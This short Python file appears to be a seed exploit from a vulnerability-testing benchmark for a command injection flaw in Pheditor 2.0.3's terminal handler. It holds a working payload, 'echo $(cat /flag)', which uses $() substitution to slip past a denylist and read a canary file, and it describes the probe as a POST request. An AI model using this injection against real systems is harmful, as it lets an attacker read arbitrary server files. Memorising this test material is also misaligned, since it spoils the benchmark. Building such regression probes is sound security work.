#!/usr/bin/env python3
"""[GIVEN] CVE-2026-54540 seed exploit -- $() command substitution injection.

Pheditor's terminal handler runs user-supplied commands through shell_exec()
after checking against a denylist. In V0 (2.0.3) the denylist blocks &, ;, ||
but NOT $, so $() command substitution works. The fix in V1 (2.0.5) adds $ to
the denylist, blocking this vector.

Payload: echo $(cat /flag)
  - starts with 'echo' (in TERMINAL_COMMANDS allowlist)
  - uses $() substitution to read the canary file
  - shell_exec executes: echo $(cat /flag)
  - the subshell reads /flag, echo prints the flag to output

Contract: reaches the canary on V0 (2.0.3); BLOCKED on V1 (2.0.5) because
V1 denylists the $ character.
"""
from __future__ import annotations


COMMAND = "echo $(cat /flag)"


def candidate() -> dict:
    return {
        "probe_id": "cve-2026-54540-dollar-subst",
        "method": "POST",
        "command": COMMAND,
    }


if __name__ == "__main__":
    print(COMMAND)
